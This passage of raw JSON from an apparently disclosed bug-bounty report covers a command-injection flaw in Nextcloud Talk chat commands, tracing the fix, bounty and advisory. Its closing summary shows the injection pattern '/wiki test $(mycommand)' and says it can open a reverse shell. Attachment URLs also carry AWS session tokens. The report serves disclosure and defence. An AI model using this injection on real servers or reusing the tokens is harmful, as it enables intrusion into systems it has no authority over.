?response-content-disposition=attachment%3B%20filename%3D%222-2-escapeshellcmd-hanging.png%22%3B%20filename%2A%3DUTF-8%27%272-2-escapeshellcmd-hanging.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYENXQUKC%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070131Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHXwr%2Bz%2B7j54GXjIZDeFjE7V4KhtcLVpveDKyRp%2FgHMpAiEA%2FzBLaI4tlPUnNvgzY0X8n68OkDDLSfCBmjTZSd2A%2BM8qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDOLyu53NKIhzdiDnLyqRA1YiznmwUquOZL6cfEwHlrCEbfV1uip5mxrCKpzmpc9DKyYejzEqNMg8%2Fo1XQZiQbQ9Mn8QGMjtqUBvpzsRmfLsdw4KO6Yix26%2Foq9H6jcEfUIX3EyFaY0ofGk42HT5lnakJ%2FUAtv5lyqirA3laDcoq6u60WpxBZh0jLi92Ajs9kGkzDbgWJPXMK2%2FlVglZWa%2BjQNhDftrEqJh4ZV%2FIwfbcJ6s89eju9B4Xkun1IUiVjrUtA5LTMlkDAEwqtGdl3pucepUSB2hZBvbqUfgiT65T%2BpLDNg0LFqEXPPPqqyrYG3%2BqTXIZxR1FfbdXOQjx1UoPwboCHOwSOpOKGaPs6TEM2o6Sg2U%2BGvuy3dMdtNBCfH4SIfBdeUa84eWUftCR4OwBiC0F1Cl6iPIZXa92zkJSAVTz9swPvr%2BghYLYGIjX%2F8jqVGlADsLB1sl%2BqlNRFkwYrvTDOWwnYmDuvQmmhpAQ6Mg%2Fp05v07WKHRsbG%2BAUzVJ3M02i0HIdWCGKjqKXgGZi%2FLBrHUEV9bzaVWmpeFEE3MObUqv8FOusBMEus3670kEKa62xVKQkID%2Fav5Xylzf384wPv9i4fBKmwghqKR67wSDPkErUtnTlN6wJNos0uBd5jibop6zjPh%2BDMaeI%2Bt4z0CbNpMS83WKn2xS%2FvSK0QFyg217PkDWCKklNPmbumtDteHdU2qRRX%2BQwVoTBmoRFgs97OyKXEz2rc7ZIcHuDnAibsNVPNZEuX9m%2B04KKBBkwdIr0sY3zEiVHvTVxPYBSsKfBPuZwzi6W3T3aq%2BF9l860FnFBaV964%2BlbASqZkuTd4cEZ8C2GJad6RyY164GfHgpKnmQ6aYbLhiDTz0xF3adlmhg%3D%3D\u0026X-Amz-Signature=9087eab975deccfead2e31e0f426fe453c1f486182dfc78682741ef146a808b4"},{"id":793059,"filename":"1-1-fix-code-changes.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/KHi3DwDDuBKDsfuAXag1wnHF?response-content-disposition=attachment%3B%20filename%3D%221-1-fix-code-changes.png%22%3B%20filename%2A%3DUTF-8%27%271-1-fix-code-changes.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYENXQUKC%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070131Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHXwr%2Bz%2B7j54GXjIZDeFjE7V4KhtcLVpveDKyRp%2FgHMpAiEA%2FzBLaI4tlPUnNvgzY0X8n68OkDDLSfCBmjTZSd2A%2BM8qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDOLyu53NKIhzdiDnLyqRA1YiznmwUquOZL6cfEwHlrCEbfV1uip5mxrCKpzmpc9DKyYejzEqNMg8%2Fo1XQZiQbQ9Mn8QGMjtqUBvpzsRmfLsdw4KO6Yix26%2Foq9H6jcEfUIX3EyFaY0ofGk42HT5lnakJ%2FUAtv5lyqirA3laDcoq6u60WpxBZh0jLi92Ajs9kGkzDbgWJPXMK2%2FlVglZWa%2BjQNhDftrEqJh4ZV%2FIwfbcJ6s89eju9B4Xkun1IUiVjrUtA5LTMlkDAEwqtGdl3pucepUSB2hZBvbqUfgiT65T%2BpLDNg0LFqEXPPPqqyrYG3%2BqTXIZxR1FfbdXOQjx1UoPwboCHOwSOpOKGaPs6TEM2o6Sg2U%2BGvuy3dMdtNBCfH4SIfBdeUa84eWUftCR4OwBiC0F1Cl6iPIZXa92zkJSAVTz9swPvr%2BghYLYGIjX%2F8jqVGlADsLB1sl%2BqlNRFkwYrvTDOWwnYmDuvQmmhpAQ6Mg%2Fp05v07WKHRsbG%2BAUzVJ3M02i0HIdWCGKjqKXgGZi%2FLBrHUEV9bzaVWmpeFEE3MObUqv8FOusBMEus3670kEKa62xVKQkID%2Fav5Xylzf384wPv9i4fBKmwghqKR67wSDPkErUtnTlN6wJNos0uBd5jibop6zjPh%2BDMaeI%2Bt4z0CbNpMS83WKn2xS%2FvSK0QFyg217PkDWCKklNPmbumtDteHdU2qRRX%2BQwVoTBmoRFgs97OyKXEz2rc7ZIcHuDnAibsNVPNZEuX9m%2B04KKBBkwdIr0sY3zEiVHvTVxPYBSsKfBPuZwzi6W3T3aq%2BF9l860FnFBaV964%2BlbASqZkuTd4cEZ8C2GJad6RyY164GfHgpKnmQ6aYbLhiDTz0xF3adlmhg%3D%3D\u0026X-Amz-Signature=f1d3cd1a8207c7ee625e189c1e54f9eea4db8a60da73b282c3b7f1de7936fd3b"},{"id":793058,"filename":"1-2-fix-not-working.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ZPnaRniwfXG4QGwRfYf1thXk?response-content-disposition=attachment%3B%20filename%3D%221-2-fix-not-working.png%22%3B%20filename%2A%3DUTF-8%27%271-2-fix-not-working.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYENXQUKC%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070131Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHXwr%2Bz%2B7j54GXjIZDeFjE7V4KhtcLVpveDKyRp%2FgHMpAiEA%2FzBLaI4tlPUnNvgzY0X8n68OkDDLSfCBmjTZSd2A%2BM8qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDOLyu53NKIhzdiDnLyqRA1YiznmwUquOZL6cfEwHlrCEbfV1uip5mxrCKpzmpc9DKyYejzEqNMg8%2Fo1XQZiQbQ9Mn8QGMjtqUBvpzsRmfLsdw4KO6Yix26%2Foq9H6jcEfUIX3EyFaY0ofGk42HT5lnakJ%2FUAtv5lyqirA3laDcoq6u60WpxBZh0jLi92Ajs9kGkzDbgWJPXMK2%2FlVglZWa%2BjQNhDftrEqJh4ZV%2FIwfbcJ6s89eju9B4Xkun1IUiVjrUtA5LTMlkDAEwqtGdl3pucepUSB2hZBvbqUfgiT65T%2BpLDNg0LFqEXPPPqqyrYG3%2BqTXIZxR1FfbdXOQjx1UoPwboCHOwSOpOKGaPs6TEM2o6Sg2U%2BGvuy3dMdtNBCfH4SIfBdeUa84eWUftCR4OwBiC0F1Cl6iPIZXa92zkJSAVTz9swPvr%2BghYLYGIjX%2F8jqVGlADsLB1sl%2BqlNRFkwYrvTDOWwnYmDuvQmmhpAQ6Mg%2Fp05v07WKHRsbG%2BAUzVJ3M02i0HIdWCGKjqKXgGZi%2FLBrHUEV9bzaVWmpeFEE3MObUqv8FOusBMEus3670kEKa62xVKQkID%2Fav5Xylzf384wPv9i4fBKmwghqKR67wSDPkErUtnTlN6wJNos0uBd5jibop6zjPh%2BDMaeI%2Bt4z0CbNpMS83WKn2xS%2FvSK0QFyg217PkDWCKklNPmbumtDteHdU2qRRX%2BQwVoTBmoRFgs97OyKXEz2rc7ZIcHuDnAibsNVPNZEuX9m%2B04KKBBkwdIr0sY3zEiVHvTVxPYBSsKfBPuZwzi6W3T3aq%2BF9l860FnFBaV964%2BlbASqZkuTd4cEZ8C2GJad6RyY164GfHgpKnmQ6aYbLhiDTz0xF3adlmhg%3D%3D\u0026X-Amz-Signature=64c9216f622263e228dbca138726363a6b2502c5a2c3bd62110de34a39164a68"}],"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7718916,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The commands in your database are not correct, they should be:\n```\nphp /var/snap/nextcloud/current/nextcloud/extra-apps/spreed/sample-commands/wikipedia.php {ARGUMENTS}\n```\nnow. so `{ARGUMENTS}` is not in quotes anymore","markdown_message":"\u003cp\u003eThe commands in your database are not correct, they should be:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ephp /var/snap/nextcloud/current/nextcloud/extra-apps/spreed/sample-commands/wikipedia.php {ARGUMENTS}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003enow. so \u003ccode\u003e{ARGUMENTS}\u003c/code\u003e is not in quotes anymore\u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-20T06:58:36.392Z","updated_at":"2020-04-20T06:58:36.392Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7719114,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for catching that, missed it in my edits. I've reinstall and redeployed your modifications. I can verify that I am no longer able to reproduce the issue. Screenshot attached of fix working as intended. ","markdown_message":"\u003cp\u003eThanks for catching that, missed it in my edits. I\u0026#39;ve reinstall and redeployed your modifications. I can verify that I am no longer able to reproduce the issue. Screenshot attached of fix working as intended. \u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-20T07:21:10.179Z","updated_at":"2020-04-20T07:21:10.179Z","actor":{"username":"covert-spectre","cleared":false,"url":"/covert-spectre","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":795684,"filename":"fixed.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/e3zCCKimFSjZFfNfPVKhM4ZB?response-content-disposition=attachment%3B%20filename%3D%22fixed.png%22%3B%20filename%2A%3DUTF-8%27%27fixed.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYENXQUKC%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070131Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHXwr%2Bz%2B7j54GXjIZDeFjE7V4KhtcLVpveDKyRp%2FgHMpAiEA%2FzBLaI4tlPUnNvgzY0X8n68OkDDLSfCBmjTZSd2A%2BM8qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDOLyu53NKIhzdiDnLyqRA1YiznmwUquOZL6cfEwHlrCEbfV1uip5mxrCKpzmpc9DKyYejzEqNMg8%2Fo1XQZiQbQ9Mn8QGMjtqUBvpzsRmfLsdw4KO6Yix26%2Foq9H6jcEfUIX3EyFaY0ofGk42HT5lnakJ%2FUAtv5lyqirA3laDcoq6u60WpxBZh0jLi92Ajs9kGkzDbgWJPXMK2%2FlVglZWa%2BjQNhDftrEqJh4ZV%2FIwfbcJ6s89eju9B4Xkun1IUiVjrUtA5LTMlkDAEwqtGdl3pucepUSB2hZBvbqUfgiT65T%2BpLDNg0LFqEXPPPqqyrYG3%2BqTXIZxR1FfbdXOQjx1UoPwboCHOwSOpOKGaPs6TEM2o6Sg2U%2BGvuy3dMdtNBCfH4SIfBdeUa84eWUftCR4OwBiC0F1Cl6iPIZXa92zkJSAVTz9swPvr%2BghYLYGIjX%2F8jqVGlADsLB1sl%2BqlNRFkwYrvTDOWwnYmDuvQmmhpAQ6Mg%2Fp05v07WKHRsbG%2BAUzVJ3M02i0HIdWCGKjqKXgGZi%2FLBrHUEV9bzaVWmpeFEE3MObUqv8FOusBMEus3670kEKa62xVKQkID%2Fav5Xylzf384wPv9i4fBKmwghqKR67wSDPkErUtnTlN6wJNos0uBd5jibop6zjPh%2BDMaeI%2Bt4z0CbNpMS83WKn2xS%2FvSK0QFyg217PkDWCKklNPmbumtDteHdU2qRRX%2BQwVoTBmoRFgs97OyKXEz2rc7ZIcHuDnAibsNVPNZEuX9m%2B04KKBBkwdIr0sY3zEiVHvTVxPYBSsKfBPuZwzi6W3T3aq%2BF9l860FnFBaV964%2BlbASqZkuTd4cEZ8C2GJad6RyY164GfHgpKnmQ6aYbLhiDTz0xF3adlmhg%3D%3D\u0026X-Amz-Signature=2ffb9e0d824601bb0d6f38deb3866b3ba4be68514cb44c39a5a7289cd7f53aec"}],"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7719149,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I added one more commit to prevent the escaped parameters from being used inside single quotes ' , double quotes \" and backticks `","markdown_message":"\u003cp\u003eI added one more commit to prevent the escaped parameters from being used inside single quotes \u0026#39; , double quotes \u0026quot; and backticks `\u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-20T07:24:38.581Z","updated_at":"2020-04-20T07:24:38.581Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7723501,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Maintenance updates 8.0.8, 7.0.3 and 6.0.5 are released.\n\nThanks a lot for your report again.We're working on the advisories at the moment.\n\nPlease let us know how you'd like to be credited in our official advisory. We require the following information:\n\n- Name / Pseudonym\n- Email address (optional)\n- Website (optional)\n- Company (optional)\n","markdown_message":"\u003cp\u003eMaintenance updates 8.0.8, 7.0.3 and 6.0.5 are released.\u003c/p\u003e\n\n\u003cp\u003eThanks a lot for your report again.We\u0026#39;re working on the advisories at the moment.\u003c/p\u003e\n\n\u003cp\u003ePlease let us know how you\u0026#39;d like to be credited in our official advisory. We require the following information:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eName / Pseudonym\u003c/li\u003e\n\u003cli\u003eEmail address (optional)\u003c/li\u003e\n\u003cli\u003eWebsite (optional)\u003c/li\u003e\n\u003cli\u003eCompany (optional)\u003c/li\u003e\n\u003c/ul\u003e\n","automated_response":false,"created_at":"2020-04-20T11:29:38.068Z","updated_at":"2020-04-20T11:29:38.068Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"covert-spectre","url":"/covert-spectre"},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7743842,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Please credit me as Spectre, no other details necessary. \nThank you. ","markdown_message":"\u003cp\u003ePlease credit me as Spectre, no other details necessary. \u003cbr\u003e\nThank you. \u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-21T18:42:58.787Z","updated_at":"2020-04-21T18:42:58.787Z","actor":{"username":"covert-spectre","cleared":false,"url":"/covert-spectre","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7748661,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-04-22T07:14:42.006Z","updated_at":"2020-04-22T07:14:42.006Z","additional_data":{"old_severity":"Critical (9.0)","new_severity":"High (8.0)","old_severity_id":694929,"new_severity_id":699436},"actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7748698,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-04-22T07:18:33.057Z","updated_at":"2020-04-22T07:18:33.057Z","additional_data":{"old_severity":"High (8.0)","new_severity":"High (8.0)","old_severity_id":699436,"new_severity_id":699440},"actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7764171,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-04-23T09:07:35.780Z","updated_at":"2020-04-23T09:07:35.780Z","additional_data":{"old_title":"RCE via Unsantized Talk Command Arugments","new_title":"Code injection possible with malformed Nextcloud Talk chat commands"},"actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7842539,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello. Is there a status update on this issue? I've been watching the [Advisories Page](https://nextcloud.com/security/advisories/) and have not seen anything related to this yet. Additionally, I wanted to inquire to see if this RCE bug will have a bounty payout. ","markdown_message":"\u003cp\u003eHello. Is there a status update on this issue? I\u0026#39;ve been watching the \u003ca href=\"/redirect?url=https%3A%2F%2Fnextcloud.com%2Fsecurity%2Fadvisories%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eAdvisories Page\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and have not seen anything related to this yet. Additionally, I wanted to inquire to see if this RCE bug will have a bounty payout. \u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-29T20:20:37.679Z","updated_at":"2020-04-29T20:20:37.679Z","actor":{"username":"covert-spectre","cleared":false,"url":"/covert-spectre","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7849548,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\n\n\u003e Is there a status update on this issue? I've been watching the Advisories Page and have not seen anything related to this yet. \n\nthe SA will be published 4 weeks after the release and is currently scheduled for 18th of May.\n\n\u003e Additionally, I wanted to inquire to see if this RCE bug will have a bounty payout. \n\nYes it is applicable for a bounty and we will set it later today.\n\ncheers","markdown_message":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eIs there a status update on this issue? I\u0026#39;ve been watching the Advisories Page and have not seen anything related to this yet. \u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003ethe SA will be published 4 weeks after the release and is currently scheduled for 18th of May.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eAdditionally, I wanted to inquire to see if this RCE bug will have a bounty payout. \u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eYes it is applicable for a bounty and we will set it later today.\u003c/p\u003e\n\n\u003cp\u003echeers\u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-30T10:05:11.095Z","updated_at":"2020-04-30T10:05:11.095Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7849615,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The advisory link will be https://nextcloud.com/security/advisory/?id=NC-SA-2020-020 and a CVE will be requested when this source is made public.","markdown_message":"\u003cp\u003eThe advisory link will be \u003ca title=\"https://nextcloud.com/security/advisory/?id=NC-SA-2020-020\" href=\"/redirect?url=https%3A%2F%2Fnextcloud.com%2Fsecurity%2Fadvisory%2F%3Fid%3DNC-SA-2020-020\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://nextcloud.com/security/advisory/?id=NC-SA-2020-020\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and a CVE will be requested when this source is made public.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-30T10:06:43.192Z","updated_at":"2020-04-30T10:06:43.192Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7856559,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2020-04-30T20:18:22.483Z","updated_at":"2020-04-30T20:18:22.483Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Nextcloud"}},"bounty_amount":"3000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"nextcloud","collaborator":{"username":"covert-spectre","url":"/covert-spectre"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7857664,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for the update and the bounty. \nLooking forward to the final advisory release. ","markdown_message":"\u003cp\u003eThank you for the update and the bounty. \u003cbr\u003e\nLooking forward to the final advisory release. \u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-30T23:16:42.743Z","updated_at":"2020-04-30T23:16:42.743Z","actor":{"username":"covert-spectre","cleared":false,"url":"/covert-spectre","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8180045,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"SA has been published:\nhttps://nextcloud.com/security/advisory/?id=NC-SA-2020-021\n","markdown_message":"\u003cp\u003eSA has been published:\u003cbr\u003e\n\u003ca title=\"https://nextcloud.com/security/advisory/?id=NC-SA-2020-021\" href=\"/redirect?url=https%3A%2F%2Fnextcloud.com%2Fsecurity%2Fadvisory%2F%3Fid%3DNC-SA-2020-021\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://nextcloud.com/security/advisory/?id=NC-SA-2020-021\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-02T14:52:51.620Z","updated_at":"2020-06-02T14:52:51.620Z","first_to_agree":true,"actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8180049,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry about the mix up its 2020-021 (as per last link) not 2020-020 like I stated end of april.","markdown_message":"\u003cp\u003eSorry about the mix up its 2020-021 (as per last link) not 2020-020 like I stated end of april.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-02T14:53:52.105Z","updated_at":"2020-06-02T14:53:52.105Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8180051,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-02T14:54:12.942Z","updated_at":"2020-06-02T14:54:12.942Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":21311,"category":"researcher","content":"The Nextcloud Talk app allows system administrators to setup chat commands that can be executed in Talk using the \"/command\" syntax. Users can provide additional arguments to the commands, such as \"/calc 1+1\" or \"/wiki Hello\", which are passed to the underlying script using @exec. If arguments are accepted, it is possible to trigger arbitrary code by wrapping the code in bash subcommand syntax /wiki test $(mycommand). This allows for arbitrary code execution, which an actor can use to spawn a reverse shell back from the remote machine.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eThe Nextcloud Talk app allows system administrators to setup chat commands that can be executed in Talk using the \u0026quot;/command\u0026quot; syntax. Users can provide additional arguments to the commands, such as \u0026quot;/calc 1+1\u0026quot; or \u0026quot;/wiki Hello\u0026quot;, which are passed to the underlying script using \u003ca href=\"/exec\"\u003e@exec\u003c/a\u003e. If arguments are accepted, it is possible to trigger arbitrary code by wrapping the code in bash subcommand syntax /wiki test $(mycommand). This allows for arbitrary code execution, which an actor can use to spawn a reverse shell back from the remote machine.\u003c/p\u003e\n"}]}